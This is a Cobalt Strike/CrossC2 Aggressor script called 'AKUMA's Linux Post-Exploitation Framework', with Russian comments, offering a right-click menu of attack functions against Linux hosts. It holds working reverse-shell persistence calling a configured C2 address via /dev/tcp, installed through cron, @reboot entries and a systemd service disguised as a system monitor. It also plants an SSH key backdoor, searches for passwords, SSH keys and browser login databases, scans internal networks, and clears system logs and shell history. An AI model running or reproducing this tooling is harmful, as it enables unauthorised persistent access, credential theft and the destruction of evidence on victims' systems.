# AKUMA's Linux Post-Exploitation Framework
# Comprehensive Linux post-exploitation toolkit for CrossC2

# ========== CONFIGURATION ==========
%postex_config = %(
    "c2_server" => "192.168.1.100",
    "callback_port" => 4444,
    "backup_ports" => @(5555, 6666, 7777),
    "working_dir" => "/tmp/.akuma",
    "max_scan_range" => 254
);

# ========== MAIN MENU ==========
popup beacon_bottom {
    menu "🔥 AKUMA Linux PostEx" {
        menu "🔍 Reconnaissance" {
            item "⚡ Quick System Enum" {
                akuma_quick_enum($1);
            }
            item "🔬 Deep System Scan" {
                akuma_deep_scan($1);
            }
            item "🌐 Network Discovery" {
                akuma_network_discovery($1);
            }
        }
        menu "🚀 Privilege Escalation" {
            item "🔍 Enum for PrivEsc" {
                akuma_privesc_enum($1);
            }
            item "🎯 Kernel Exploits Check" {
                akuma_kernel_check($1);
            }
            item "🔑 SUID/SGID Hunt" {
                akuma_suid_hunt($1);
            }
        }
        menu "🔒 Persistence" {
            item "🕒 Install Cron Backdoors" {
                akuma_cron_persistence($1);
            }
            item "🔑 SSH Key Backdoor" {
                akuma_ssh_persistence($1);
            }
            item "🎭 Service Persistence" {
                akuma_service_persistence($1);
            }
        }
        menu "📡 Lateral Movement" {
            item "🔍 Trust Relationship Enum" {
                akuma_trust_enum($1);
            }
            item "🌐 Internal Network Scan" {
                akuma_internal_scan($1);
            }
            item "📋 Share Discovery" {
                akuma_share_discovery($1);
            }
        }
        menu "💾 Data Collection" {
            item "🗂️ Sensitive File Hunt" {
                akuma_file_hunt($1);
            }
            item "🌐 Browser Data Extract" {
                akuma_browser_extract($1);
            }
            item "💽 Database Discovery" {
                akuma_database_discovery($1);
            }
        }
        menu "🧹 Cleanup" {
            item "🗑️ Clear Logs" {
                akuma_cleanup_logs($1);
            }
            item "👻 Enable Stealth Mode" {
                akuma_stealth_mode($1);
            }
        }
    }
}

# ========== RECONNAISSANCE FUNCTIONS ==========

sub akuma_quick_enum {
    local('$bid');
    $bid = $1;
    
    blog($bid, "🔥 AKUMA Quick System Enumeration Starting...");
    
    # Базовая информация о системе
    bshell($bid, "echo '=== AKUMA SYSTEM FINGERPRINT ==='");
    bshell($bid, "whoami && hostname && pwd");
    bshell($bid, "uname -a");
    bshell($bid, "cat /etc/os-release 2>/dev/null || cat /etc/issue");
    bshell($bid, "uptime && date");
    
    # Пользователь и права
    bshell($bid, "echo '=== USER CONTEXT ==='");
    bshell($bid, "id && groups");
    bshell($bid, "sudo -l 2>/dev/null");
    
    # Процессы и сеть
    bshell($bid, "echo '=== RUNNING PROCESSES ==='");
    bshell($bid, "ps aux --sort=-%cpu | head -10");
    bshell($bid, "echo '=== NETWORK ==='");
    bshell($bid, "ip addr show 2>/dev/null || ifconfig");
    bshell($bid, "ss -tlnp 2>/dev/null || netstat -tlnp");
    
    blog($bid, "✅ AKUMA Quick Enumeration Complete!");
}

sub akuma_deep_scan {
    local('$bid');
    $bid = $1;
    
    blog($bid, "🔍 AKUMA Deep System Scan Starting...");
    
    # Системная информация
    bshell($bid, "echo '=== AKUMA DEEP SYSTEM ANALYSIS ==='");
    bshell($bid, "echo '=== SYSTEM INFO ==='");
    bshell($bid, "uname -a");
    bshell($bid, "hostnamectl 2>/dev/null || hostname -f");
    bshell($bid, "cat /proc/version");
    bshell($bid, "lsb_release -a 2>/dev/null");
    
    bshell($bid, "echo '=== HARDWARE ==='");
    bshell($bid, "lscpu 2>/dev/null | head -10");
    bshell($bid, "free -h");
    bshell($bid, "df -h");
    bshell($bid, "lsblk 2>/dev/null");
    
    bshell($bid, "echo '=== USERS & GROUPS ==='");
    bshell($bid, "cat /etc/passwd | grep -E '/bin/(bash|zsh|sh)$'");
    bshell($bid, "cat /etc/group | grep -E '(sudo|wheel|admin)'");
    bshell($bid, "lastlog 2>/dev/null | head -10");
    bshell($bid, "w 2>/dev/null");
    
    bshell($bid, "echo '=== SERVICES ==='");
    bshell($bid, "systemctl list-units --type=service --state=running 2>/dev/null | head -20");
    bshell($bid, "ps aux --sort=-%mem | head -15");
    
    bshell($bid, "echo '=== NETWORK DETAILED ==='");
    bshell($bid, "ip route 2>/dev/null || route -n");
    bshell($bid, "cat /etc/resolv.conf");
    bshell($bid, "arp -a 2>/dev/null | head -20");
    bshell($bid, "ss -anp 2>/dev/null | grep ESTABLISHED | head -15");
    
    bshell($bid, "echo '=== INSTALLED SOFTWARE ==='");
    bshell($bid, "dpkg -l 2>/dev/null | grep -E '(apache|nginx|mysql|postgres|docker)' || rpm -qa 2>/dev/null | grep -E '(apache|nginx|mysql|postgres|docker)'");
    
    bshell($bid, "echo '=== MOUNTS & STORAGE ==='");
    bshell($bid, "mount | grep -v 'tmpfs\\|proc\\|sys'");
    bshell($bid, "cat /etc/fstab | grep -v '^#'");
    
    blog($bid, "✅ AKUMA Deep Scan Complete!");
}

sub akuma_network_discovery {
    local('$bid');
    $bid = $1;
    
    blog($bid, "🌐 AKUMA Network Discovery Starting...");
    
    # Базовая сетевая информация
    bshell($bid, "echo '=== NETWORK DISCOVERY ==='");
    bshell($bid, "ip route | grep -E '^[0-9]' | awk '{print $1}' | grep '/'");
    bshell($bid, "arp -a 2>/dev/null | head -20");
    
    # Поиск живых хостов
    bshell($bid, "echo '=== PING SWEEP ==='");
    bshell($bid, "for i in {1..20}; do ping -c 1 -W 1 192.168.1.$i >/dev/null 2>&1 && echo \"192.168.1.$i alive\" &; done; wait");
    bshell($bid, "for i in {1..20}; do ping -c 1 -W 1 10.0.0.$i >/dev/null 2>&1 && echo \"10.0.0.$i alive\" &; done; wait");
    
    # Сканирование портов localhost
    bshell($bid, "echo '=== PORT SCAN LOCALHOST ==='");
    bshell($bid, "for port in 21 22 23 25 53 80 135 139 443 445 993 995 1433 3389 5432 8080; do timeout 1 bash -c \"</dev/tcp/localhost/$port\" 2>/dev/null && echo \"Port $port open\"; done");
    
    blog($bid, "✅ AKUMA Network Discovery Complete!");
}

# ========== PRIVILEGE ESCALATION FUNCTIONS ==========

sub akuma_privesc_enum {
    local('$bid');
    $bid = $1;
    
    blog($bid, "🚀 AKUMA Privilege Escalation Enumeration Starting...");
    
    bshell($bid, "echo '=== AKUMA PRIVESC ENUMERATION ==='");
    
    # Текущие права
    bshell($bid, "echo '=== CURRENT PRIVILEGES ==='");
    bshell($bid, "id && groups");
    bshell($bid, "sudo -l 2>/dev/null");
    
    # SUID/SGID файлы
    bshell($bid, "echo '=== SUID/SGID BINARIES ==='");
    bshell($bid, "find / -perm -4000 -type f 2>/dev/null | head -20");
    bshell($bid, "find / -perm -2000 -type f 2>/dev/null | head -20");
    
    # Writable directories
    bshell($bid, "echo '=== WORLD WRITABLE DIRECTORIES ==='");
    bshell($bid, "find / -writable -type d 2>/dev/null | grep -v proc | head -20");
    
    # Cron jobs
    bshell($bid, "echo '=== CRON JOBS ==='");
    bshell($bid, "crontab -l 2>/dev/null");
    bshell($bid, "cat /etc/crontab 2>/dev/null");
    bshell($bid, "ls -la /etc/cron* 2>/dev/null");
    
    # Процессы root
    bshell($bid, "echo '=== ROOT PROCESSES ==='");
    bshell($bid, "ps aux | grep '^root' | head -15");
    
    blog($bid, "✅ AKUMA PrivEsc Enumeration Complete!");
}

sub akuma_kernel_check {
    local('$bid');
    $bid = $1;
    
    blog($bid, "🎯 AKUMA Kernel Exploits Check Starting...");
    
    bshell($bid, "echo '=== KERNEL EXPLOIT CHECK ==='");
    bshell($bid, "uname -a");
    bshell($bid, "cat /proc/version");
    bshell($bid, "lsb_release -a 2>/dev/null");
    
    # Проверка на известные уязвимости
    bshell($bid, "echo '=== CHECKING FOR KNOWN VULNERABILITIES ==='");
    bshell($bid, "uname -r | grep -E '(3\\.13|4\\.4|4\\.8|4\\.10)' && echo 'Potentially vulnerable kernel version!'");
    
    blog($bid, "✅ AKUMA Kernel Check Complete!");
}

sub akuma_suid_hunt {
    local('$bid');
    $bid = $1;
    
    blog($bid, "🔑 AKUMA SUID/SGID Hunt Starting...");
    
    bshell($bid, "echo '=== SUID/SGID HUNT ==='");
    
    # Поиск интересных SUID/SGID файлов
    bshell($bid, "find / -perm -4000 -type f 2>/dev/null | xargs ls -la 2>/dev/null");
    bshell($bid, "find / -perm -2000 -type f 2>/dev/null | xargs ls -la 2>/dev/null");
    
    # Проверка на GTFOBins candidates
    bshell($bid, "echo '=== POTENTIAL GTFOBINS CANDIDATES ==='");
    bshell($bid, "find / -perm -4000 -name 'vim*' -o -name 'nano*' -o -name 'less*' -o -name 'more*' -o -name 'nmap*' -o -name 'awk*' -o -name 'python*' -o -name 'perl*' 2>/dev/null");
    
    blog($bid, "✅ AKUMA SUID Hunt Complete!");
}

# ========== PERSISTENCE FUNCTIONS ==========

sub akuma_cron_persistence {
    local('$bid', '$server', '$port');
    $bid = $1;
    $server = %postex_config["c2_server"];
    $port = %postex_config["callback_port"];
    
    blog($bid, "🕒 AKUMA Cron Persistence Starting...");
    
    # Добавляем задачи в crontab
    bshell($bid, "(crontab -l 2>/dev/null; echo '*/15 * * * * /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . $port . " 0>&1\"') | crontab -");
    bshell($bid, "(crontab -l 2>/dev/null; echo '@reboot sleep 60 && /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . $port . " 0>&1\"') | crontab -");
    
    # Если есть права root - системные cron
    bshell($bid, "if [ \"$EUID\" -eq 0 ]; then echo '*/10 * * * * root /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . $port . " 0>&1\"' >> /etc/crontab; fi");
    
    blog($bid, "✅ AKUMA Cron Persistence Complete!");
}

sub akuma_ssh_persistence {
    local('$bid');
    $bid = $1;
    
    blog($bid, "🔑 AKUMA SSH Persistence Starting...");
    
    # Генерируем SSH ключи
    bshell($bid, "ssh-keygen -t rsa -b 2048 -f ~/.ssh/akuma_key -N '' 2>/dev/null");
    bshell($bid, "cat ~/.ssh/akuma_key.pub >> ~/.ssh/authorized_keys 2>/dev/null");
    bshell($bid, "chmod 600 ~/.ssh/authorized_keys 2>/dev/null");
    bshell($bid, "cat ~/.ssh/akuma_key");
    
    blog($bid, "✅ AKUMA SSH Persistence Complete! Private key printed above.");
}

sub akuma_service_persistence {
    local('$bid', '$server', '$port');
    $bid = $1;
    $server = %postex_config["c2_server"];
    $port = %postex_config["callback_port"];
    
    blog($bid, "🎭 AKUMA Service Persistence Starting...");
    
    # Создаем systemd service (если root)
    bshell($bid, "if [ \"$EUID\" -eq 0 ]; then cat > /etc/systemd/system/akuma-service.service << 'EOF'");
    bshell($bid, "[Unit]");
    bshell($bid, "Description=System Monitor Service");
    bshell($bid, "After=network.target");
    bshell($bid, "");
    bshell($bid, "[Service]");
    bshell($bid, "Type=simple");
    bshell($bid, "ExecStart=/bin/bash -c 'while true; do sleep 300; /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . $port . " 0>&1\" 2>/dev/null; done'");
    bshell($bid, "Restart=always");
    bshell($bid, "User=nobody");
    bshell($bid, "");
    bshell($bid, "[Install]");
    bshell($bid, "WantedBy=multi-user.target");
    bshell($bid, "EOF");
    bshell($bid, "systemctl enable akuma-service.service 2>/dev/null; systemctl start akuma-service.service 2>/dev/null; fi");
    
    blog($bid, "✅ AKUMA Service Persistence Complete!");
}

# ========== LATERAL MOVEMENT FUNCTIONS ==========

sub akuma_trust_enum {
    local('$bid');
    $bid = $1;
    
    blog($bid, "🔍 AKUMA Trust Relationship Enumeration Starting...");
    
    bshell($bid, "echo '=== TRUST RELATIONSHIP ANALYSIS ==='");
    
    bshell($bid, "echo '=== SSH CONNECTIONS ==='");
    bshell($bid, "ss -anp 2>/dev/null | grep :22 | grep ESTABLISHED");
    bshell($bid, "netstat -anp 2>/dev/null | grep :22 | grep ESTABLISHED");
    
    bshell($bid, "echo '=== KNOWN HOSTS ==='");
    bshell($bid, "cat ~/.ssh/known_hosts 2>/dev/null | awk '{print $1}' | sort -u");
    bshell($bid, "find /home -name 'known_hosts' 2>/dev/null | xargs cat 2>/dev/null | awk '{print $1}' | sort -u");
    
    bshell($bid, "echo '=== RECENT CONNECTIONS ==='");
    bshell($bid, "last -i | head -20");
    bshell($bid, "lastlog 2>/dev/null | head -10");
    
    bshell($bid, "echo '=== SSH CONFIG ==='");
    bshell($bid, "cat ~/.ssh/config 2>/dev/null");
    bshell($bid, "find /home -name 'config' -path '*/.ssh/*' 2>/dev/null | xargs cat 2>/dev/null");
    
    blog($bid, "✅ AKUMA Trust Enumeration Complete!");
}

sub akuma_internal_scan {
    local('$bid');
    $bid = $1;
    
    blog($bid, "🌐 AKUMA Internal Network Scan Starting...");
    
    # Получаем сетевые диапазоны
    bshell($bid, "echo '=== INTERNAL NETWORK SCAN ==='");
    bshell($bid, "ip route | grep -E '^[0-9]' | awk '{print $1}' | grep '/'");
    
    # Быстрое сканирование общих портов
    bshell($bid, "echo '=== PORT SCANNING COMMON HOSTS ==='");
    bshell($bid, "for host in 192.168.1.1 192.168.1.10 192.168.1.100 10.0.0.1 10.0.0.10; do echo \"Scanning $host:\"; for port in 22 80 135 139 443 445 3389; do timeout 1 bash -c \"</dev/tcp/$host/$port\" 2>/dev/null && echo \"  $port/tcp open\"; done; done");
    
    blog($bid, "✅ AKUMA Internal Scan Complete!");
}

sub akuma_share_discovery {
    local('$bid');
    $bid = $1;
    
    blog($bid, "📋 AKUMA Share Discovery Starting...");
    
    bshell($bid, "echo '=== NETWORK SHARES DISCOVERY ==='");
    
    bshell($bid, "echo '=== NFS SHARES ==='");
    bshell($bid, "showmount -e 2>/dev/null");
    bshell($bid, "showmount -e localhost 2>/dev/null");
    bshell($bid, "cat /etc/exports 2>/dev/null");
    bshell($bid, "mount | grep nfs");
    
    bshell($bid, "echo '=== SMB/CIFS SHARES ==='");
    bshell($bid, "smbclient -L //localhost -N 2>/dev/null");
    bshell($bid, "mount | grep cifs");
    bshell($bid, "cat /etc/samba/smb.conf 2>/dev/null | grep -v '^#' | grep -v '^$'");
    
    bshell($bid, "echo '=== CURRENT MOUNTS ==='");
    bshell($bid, "mount | grep -E 'nfs|cifs|sshfs|ftp'");
    bshell($bid, "cat /etc/fstab | grep -E 'nfs|cifs|sshfs|ftp'");
    
    blog($bid, "✅ AKUMA Share Discovery Complete!");
}

# ========== DATA COLLECTION FUNCTIONS ==========

sub akuma_file_hunt {
    local('$bid');
    $bid = $1;
    
    blog($bid, "🗂️ AKUMA Sensitive File Hunt Starting...");
    
    bshell($bid, "echo '=== SENSITIVE FILE HUNT ==='");
    
    # Поиск документов
    bshell($bid, "echo '=== DOCUMENTS ==='");
    bshell($bid, "find /home -type f \\( -name '*.pdf' -o -name '*.doc' -o -name '*.docx' -o -name '*.xls' -o -name '*.xlsx' \\) 2>/dev/null | head -20");
    
    # Поиск паролей в файлах
    bshell($bid, "echo '=== PASSWORD FILES ==='");
    bshell($bid, "find /home -type f -name '*.txt' 2>/dev/null | xargs grep -l -i 'password' 2>/dev/null | head -10");
    bshell($bid, "find /home -type f -name '*.conf' 2>/dev/null | xargs grep -l -i 'password' 2>/dev/null | head -10");
    
    # SSH ключи
    bshell($bid, "echo '=== SSH KEYS ==='");
    bshell($bid, "find /home -type f -name 'id_*' 2>/dev/null | head -10");
    bshell($bid, "find /home -type f -name '*.pem' 2>/dev/null | head -10");
    
    # Архивы
    bshell($bid, "echo '=== ARCHIVES ==='");
    bshell($bid, "find /home -type f \\( -name '*.zip' -o -name '*.rar' -o -name '*.tar' -o -name '*.gz' \\) 2>/dev/null | head -15");
    
    blog($bid, "✅ AKUMA File Hunt Complete!");
}

sub akuma_browser_extract {
    local('$bid');
    $bid = $1;
    
    blog($bid, "🌐 AKUMA Browser Data Extract Starting...");
    
    bshell($bid, "echo '=== BROWSER DATA EXTRACTION ==='");
    
    # Firefox
    bshell($bid, "echo '=== FIREFOX ==='");
    bshell($bid, "find /home -path '*/.mozilla/firefox/*/places.sqlite' 2>/dev/null");
    bshell($bid, "find /home -path '*/.mozilla/firefox/*/key4.db' 2>/dev/null");
    bshell($bid, "find /home -path '*/.mozilla/firefox/*/logins.json' 2>/dev/null");
    
    # Chrome/Chromium
    bshell($bid, "echo '=== CHROME/CHROMIUM ==='");
    bshell($bid, "find /home -path '*/.config/google-chrome/*/Login Data' 2>/dev/null");
    bshell($bid, "find /home -path '*/.config/chromium/*/Login Data' 2>/dev/null");
    bshell($bid, "find /home -path '*/.config/google-chrome/*/History' 2>/dev/null");
    
    blog($bid, "✅ AKUMA Browser Extract Complete!");
}

sub akuma_database_discovery {
    local('$bid');
    $bid = $1;
    
    blog($bid, "💽 AKUMA Database Discovery Starting...");
    
    bshell($bid, "echo '=== DATABASE DISCOVERY ==='");
    
    # Поиск файлов баз данных
    bshell($bid, "echo '=== DATABASE FILES ==='");
    bshell($bid, "find / -name '*.sql' -o -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null | head -20");
    
    # Проверка запущенных служб БД
    bshell($bid, "echo '=== DATABASE SERVICES ==='");
    bshell($bid, "ps aux | grep -E 'mysql|postgres|mongo|redis' | grep -v grep");
    bshell($bid, "ss -tlnp | grep -E ':3306|:5432|:27017|:6379'");
    
    # Конфигурационные файлы
    bshell($bid, "echo '=== DATABASE CONFIGS ==='");
    bshell($bid, "find /etc -name '*mysql*' -o -name '*postgres*' 2>/dev/null | head -10");
    
    blog($bid, "✅ AKUMA Database Discovery Complete!");
}

# ========== CLEANUP FUNCTIONS ==========

sub akuma_cleanup_logs {
    local('$bid');
    $bid = $1;
    
    blog($bid, "🗑️ AKUMA Log Cleanup Starting...");
    
    bshell($bid, "echo '=== LOG CLEANUP ==='");
    
    # Очистка системных логов
    bshell($bid, "if [ \"$EUID\" -eq 0 ]; then");
    bshell($bid, "  > /var/log/auth.log");
    bshell($bid, "  > /var/log/secure");
    bshell($bid, "  > /var/log/messages");
    bshell($bid, "  > /var/log/syslog");
    bshell($bid, "  echo 'System logs cleared'");
    bshell($bid, "else");
    bshell($bid, "  echo 'Need root for system log cleanup'");
    bshell($bid, "fi");
    
    # Очистка пользовательских логов
    bshell($bid, "> ~/.bash_history");
    bshell($bid, "> ~/.zsh_history");
    bshell($bid, "history -c");
    bshell($bid, "export HISTFILE=/dev/null");
    bshell($bid, "unset HISTFILE");
    
    blog($bid, "✅ AKUMA Log Cleanup Complete!");
}

sub akuma_stealth_mode {
    local('$bid');
    $bid = $1;
    
    blog($bid, "👻 AKUMA Stealth Mode Starting...");
    
    # Отключаем логирование
    bshell($bid, "export HISTFILE=/dev/null");
    bshell($bid, "unset HISTFILE");
    bshell($bid, "history -c");
    bshell($bid, "set +o history");
    
    # Удаляем временные файлы
    bshell($bid, "rm -rf /tmp/.akuma* 2>/dev/null");
    bshell($bid, "rm -rf /var/tmp/.akuma* 2>/dev/null");
    
    # Очистка следов в памяти
    bshell($bid, "echo 3 > /proc/sys/vm/drop_caches 2>/dev/null || echo 'Cannot clear caches'");
    
    blog($bid, "✅ AKUMA Stealth Mode Enabled!");
}

blog("🔥 AKUMA Linux PostEx Framework Loaded! Right-click beacon for menu.");
